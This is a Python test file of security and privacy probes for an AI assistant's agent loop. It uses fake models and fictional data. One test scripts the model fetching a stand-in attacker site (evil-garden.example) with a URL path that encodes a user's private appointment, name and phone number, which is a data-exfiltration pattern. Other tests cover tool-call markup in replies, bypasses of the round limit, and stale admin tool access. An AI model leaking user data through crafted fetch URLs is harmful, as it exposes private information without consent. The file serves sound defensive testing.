"""Fork: known bugs in the brain (fork/brain/), found by a bug hunt on 2026-10-31.

Each test states the behaviour we want; most fail today, so the module is xfail (not
strict: a few probes already pass and guard against regressions). Remove the marker
from a test once its bug is fixed. Fictional data only."""
from __future__ import annotations

import json
import pytest

from fork.brain import turn as brain_turn
from fork.brain import query_guard as qg
from tests.fork.brain_fakes import Brain, calls, of, text, search_output

pytestmark = pytest.mark.xfail(reason="known brain bugs, not fixed yet", strict=False)


@pytest.fixture
def brain(monkeypatch, data_dir):
    return Brain(monkeypatch, data_dir)


async def test_probe_fetch_same_site_path_exfil(brain):
    sess = brain.session()
    brain.results["web_search"] = {"output": search_output("Gardening tips", "https://evil-garden.example/tips"), "exit_code": 0}
    brain.llm.rounds(
        [calls(("web_search", {"query": "gardening tips"}))],
        [calls(("web_fetch", {"url": "https://evil-garden.example/c/dentist-tuesday-wren-hale-555-0199"}))],
        [text("done")])
    events = await brain.run(sess, "give me gardening tips")
    ran = [r["tool"] for r in brain.ran]
    print("RAN", ran, "ASK", len(of(events, "ask_user")))
    assert "web_fetch" not in ran, "fetch of a made-up path on a hit's site ran without asking"


async def test_probe_final_round_native_calls_keep_running(brain):
    brain.mp.setenv("FORK_BRAIN_MAX_ROUNDS", "1")
    sess = brain.session()
    brain.llm.rounds(
        [calls(("web_search", {"query": "a"}))],
        [calls(("web_search", {"query": "b"}))],   # final round, tools=() but server sends calls
        [calls(("web_search", {"query": "c"}))],
        [calls(("web_search", {"query": "d"}))],
        [text("done")])
    await brain.run(sess, "loop")
    print("requests", len(brain.llm.requests), "ran", [r["content"] for r in brain.ran])
    assert len(brain.llm.requests) <= 2, f"{len(brain.llm.requests)} model rounds with max_rounds=1"


TERMS = (["Wren Hale", "Zoë Brandt", "José García", "Jordan Vale", "Mo"], ["Chemo appointment Dr Okafor"])


@pytest.mark.parametrize("query", [
    "Wren_Hale birthday gift", "Wren.Hale linkedin", "WrenHale", "wren hale",
    "Wren​Hale", "W r e n Hale", "Zoe Brandt address", "Jose Garcia lawyer",
    "Jordan Vale".upper(), "Jordan Vales", "chemo appointment dr okafor reviews",
    "Chemo appointment with Dr Okafor", "5551234567", "+1 555 0199",
    "12 elm street springfield", "Elm Street 12 Springfield", "jane at example dot com",
    "Hale family", "Mo's surgery",
])
def test_probe_guard(monkeypatch, query):
    monkeypatch.setattr(qg, "_private_terms", lambda owner: TERMS)
    out, n = qg.guard_query(query, "alice")
    print(repr(query), "->", repr(out), n)
    assert n > 0, f"nothing removed from {query!r}: {out!r}"


from tests.fork.brain_fakes import answer_text


@pytest.mark.parametrize("reply", [
    "In JavaScript, write <function name> like this: function f() {}. Done.",
    "Use the <parameter> element inside <invoke>. That is all.",
    "The tag [TOOL_CALL] is a marker. End.",
    '<tool_call>{"name": "web_search", "arguments": {"query": "x"</tool_call>',
    '<tool_call>{"name": "send_email", "arguments": {"to": "a@b.example"}}</tool_call>',
])
async def test_probe_markup_text(brain, reply):
    sess = brain.session()
    brain.llm.rounds([text(reply)], [text("second")])
    events = await brain.run(sess, "explain")
    shown = answer_text(events)
    finals = [e.get("content") for e in of(events, "final_response")]
    print(repr(reply[:40]), "-> shown", repr(shown), "final", finals, "saved", repr(sess.history[-1].content), "ran", [r["tool"] for r in brain.ran])
    assert sess.history[-1].content not in ("(no answer)", "Done.", "")


async def test_probe_demoted_admin_keeps_mcp_tools(brain):
    sess = brain.session()
    brain.llm.rounds([text("hi")], [calls(("mcp__convo__search_transcripts", {"query": "x"}))], [text("ok")])
    await brain.run(sess, "hello")
    brain.mp.setattr("src.tool_security.owner_is_admin_or_single_user", lambda owner: False)
    await brain.run(sess, "search my transcripts")
    offered = [t["function"]["name"] for t in brain.llm.requests[1].get("tools", [])]
    print("offered after demotion", offered, "ran", [r["tool"] for r in brain.ran])
    assert not any(n.startswith("mcp__") for n in offered)


def test_probe_forget_across_line_break(data_dir):
    from fork.brain import history as h
    msgs = [{"role": "tool", "name": "mcp__convo__get_transcript", "tool_call_id": "c1",
             "content": "[00:12] Wren: I am moving to\nLisbon in May next year"}]
    h.save_turn("chat-9", "m1", msgs, owner="alice")
    n = h.forget_texts("alice", ["I am moving to Lisbon in May next year"])
    print("dropped", n, "left", list(h.exchanges("chat-9")))
    assert n == 1


@pytest.mark.parametrize("url", ["http://llama-server:8080/v1", "http://gpu-box.local:8080/v1",
    "http://[fd7a:115c:a1e0::1]:8080/v1", "http://server.tail1234.ts.net:8080/v1",
    "http://[fe80::1]:8080/v1", "http://ollama:11434"])
def test_probe_local_hostnames(monkeypatch, url):
    monkeypatch.setattr("fork.upstream.configured_endpoint_kind", lambda u: "auto")
    print(url, brain_turn.is_local(url))
    assert brain_turn.is_local(url)
